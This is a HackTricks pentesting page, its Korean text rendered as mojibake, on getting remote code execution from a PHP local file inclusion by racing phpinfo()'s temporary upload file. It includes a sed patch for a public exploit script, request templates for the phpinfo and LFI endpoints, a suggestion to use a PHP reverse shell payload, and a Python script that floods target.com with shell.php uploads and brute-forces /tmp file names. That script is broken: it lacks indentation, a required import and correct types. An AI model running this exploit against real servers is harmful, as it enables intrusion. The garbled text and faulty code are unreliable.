<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>


ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒì´ í•„ìš”í•©ë‹ˆë‹¤: **LFI ì·¨ì•½ì , phpinfo()ê°€ í‘œì‹œë˜ëŠ” í˜ì´ì§€, "file\_uploads = on" ë° ì„œë²„ê°€ "/tmp" ë””ë ‰í† ë¦¬ì— ì“¸ ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**HTB íŠœí† ë¦¬ì–¼**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

ì·¨ì•½ì ì„ ìˆ˜ì •í•´ì•¼ í•©ë‹ˆë‹¤ (**=>**ë¥¼ **=>**ë¡œ ë³€ê²½). ì´ë¥¼ ìœ„í•´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
**í˜ì´ë¡œë“œ**ë¥¼ ë¨¼ì € ë³€ê²½í•´ì•¼ í•©ë‹ˆë‹¤. (ì˜ˆ: php-rev-shell), **REQ1**ë„ ë³€ê²½í•´ì•¼ í•©ë‹ˆë‹¤ (phpinfo í˜ì´ì§€ë¥¼ ê°€ë¦¬ì¼œì•¼ í•˜ë©° íŒ¨ë”©ì´ í¬í•¨ë˜ì–´ì•¼ í•¨, ì¦‰: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_). ê·¸ë¦¬ê³  **LFIREQ**ë„ ë³€ê²½í•´ì•¼ í•©ë‹ˆë‹¤ (LFI ì·¨ì•½ì ì„ ê°€ë¦¬ì¼œì•¼ í•¨, ì¦‰: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ ë„ ë¬¸ìë¥¼ ì´ìš©í•˜ì—¬ ê³µê²©í•  ë•Œ ì´ì¤‘ "%"ë¥¼ í™•ì¸í•˜ì„¸ìš”).

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### ì´ë¡ 

PHPì—ì„œ íŒŒì¼ ì—…ë¡œë“œê°€ í—ˆìš©ë˜ê³  íŒŒì¼ì„ ì—…ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•˜ë©´, ì´ íŒŒì¼ì€ ì„œë²„ê°€ ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” ë™ì•ˆ ì„ì‹œ ë””ë ‰í† ë¦¬ì— ì €ì¥ë˜ê³ , ê·¸ëŸ° ë‹¤ìŒ ì´ ì„ì‹œ íŒŒì¼ì€ ì‚­ì œë©ë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ, ì›¹ ì„œë²„ì—ì„œ LFI ì·¨ì•½ì ì„ ì°¾ì€ ê²½ìš° ì„ì‹œ íŒŒì¼ì˜ ì´ë¦„ì„ ì¶”ì¸¡í•˜ê³ , ì„œë²„ê°€ íŒŒì¼ì„ ì‚­ì œí•˜ê¸° ì „ì— ì„ì‹œ íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ RCEë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Windows**ì—ì„œ íŒŒì¼ì€ ì¼ë°˜ì ìœ¼ë¡œ **C:\Windows\temp\php**ì— ì €ì¥ë©ë‹ˆë‹¤.

**Linux**ì—ì„œ íŒŒì¼ì˜ ì´ë¦„ì€ ì¼ë°˜ì ìœ¼ë¡œ **ì„ì˜ì˜** ì´ë¦„ì´ë©° **/tmp**ì— ìœ„ì¹˜í•©ë‹ˆë‹¤. ì´ë¦„ì´ ì„ì˜ë¡œ ìƒì„±ë˜ë¯€ë¡œ ì„ì‹œ íŒŒì¼ì˜ ì´ë¦„ì„ **ì–´ë”˜ê°€ì—ì„œ ì¶”ì¶œ**í•˜ê³ , phpconfig() í•¨ìˆ˜ì˜ ë‚´ìš©ì—ì„œ **$\_FILES ë³€ìˆ˜ì˜ ê°’ì„ ì½ì–´ì•¼ í•©ë‹ˆë‹¤**.

**phpinfo()**

**PHP**ëŠ” **4096B**ì˜ ë²„í¼ë¥¼ ì‚¬ìš©í•˜ë©°, ë²„í¼ê°€ **ê°€ë“ ì°¨ë©´ í´ë¼ì´ì–¸íŠ¸ë¡œ ì „ì†¡**ë©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ í´ë¼ì´ì–¸íŠ¸ëŠ” **í° í—¤ë”ë¥¼ ì‚¬ìš©í•˜ì—¬ ë§ì€ í° ìš”ì²­**ì„ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ php **ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì—…ë¡œë“œ**í•œ ë‹¤ìŒ, phpinfo()ì˜ **ì²« ë²ˆì§¸ ë¶€ë¶„ì´ ë°˜í™˜ë  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦° ë‹¤ìŒ** LFI ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ php ì„œë²„ê°€ íŒŒì¼ì„ ì‚­ì œí•˜ê¸° ì „ì— ì„ì‹œ íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ê³  ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì´ë¦„ì„ ë¸Œë£¨íŠ¸í¬ìŠ¤ë¡œ ì¶”ì¸¡í•˜ê¸° ìœ„í•œ Python ìŠ¤í¬ë¦½íŠ¸ (ê¸¸ì´ê°€ 6ì¸ ê²½ìš°)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
